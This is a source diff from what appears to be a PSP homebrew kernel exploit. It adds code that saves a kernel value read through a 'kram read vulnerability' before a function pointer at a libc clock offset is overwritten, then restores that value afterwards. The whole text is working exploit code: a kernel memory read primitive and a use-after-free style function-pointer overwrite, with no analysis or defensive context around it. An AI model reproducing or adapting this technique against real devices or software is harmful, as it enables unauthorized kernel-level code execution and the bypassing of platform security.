@@ -35,6 +35,7 @@ Put together by Acid_Snake and meetpatty.
 
 UserFunctions* g_tbl = NULL;
 static int libc_clock_offset = LIBC_CLOCK_OFFSET_360;
+static int libc_prev_value = 0;
 void (*_sceNetMCopyback_1560F143)(uint32_t * a0, uint32_t a1, uint32_t a2, uint32_t a3);
 
 /* Actual code to trigger the kram read vulnerability.
@@ -96,12 +97,7 @@ u32 readKram(u32 addr) {
 }
 
 void repairInstruction(KernelFunctions* k_tbl) {
-  /*
-    SceModule2 *mod = k_tbl->KernelFindModuleByName("sceRTC_Service");
-    _sw(mod->text_addr + 0x3904, libc_clock_offset);
-    k_tbl->KernelIcacheInvalidateAll();
-    k_tbl->KernelDcacheWritebackInvalidateAll(); 
-  */
+  _sw(libc_prev_value, libc_clock_offset);
 }
 
 int stubScanner(UserFunctions* tbl){
@@ -164,6 +160,8 @@ int doExploit(void) {
     SceUID plantid = g_tbl->KernelAllocPartitionMemory(PSP_MEMORY_PARTITION_USER, (char *)string, PSP_SMEM_High, 0x10, NULL);
 
     //g_tbl->KernelDcacheWritebackAll();
+
+    libc_prev_value = readKram(libc_clock_offset);
 
     // Overwrite function pointer at LIBC_CLOCK_OFFSET with 0x88888888
     res = g_tbl->KernelFreePartitionMemory(uid);
